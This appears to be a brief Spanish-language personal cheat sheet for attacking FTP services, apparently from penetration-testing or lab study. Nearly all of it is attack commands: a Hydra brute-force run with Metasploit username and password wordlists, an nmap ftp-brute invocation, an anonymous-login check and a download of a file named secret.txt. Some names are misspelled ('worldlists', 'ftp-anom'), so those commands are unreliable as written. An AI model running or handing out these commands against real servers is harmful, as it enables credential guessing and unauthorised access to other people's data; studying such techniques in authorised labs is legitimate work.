Fuerza bruta con Hydra a un ftp
```bash

hydra -L /usr/share/metasploit-framework/data/worldlists/common_users.txt -P /usr/share/metasploit-framework/data/worldlists/unix_passwords.txt ip ftp
```

```bash
#Descargar un file del ftp
ftp>get secret.txt

nmap ip --script ftp-brute --script-arg userdb=/root/users -p 21

Anonimus Login
nmap ip --script ftp-anom -p 21
```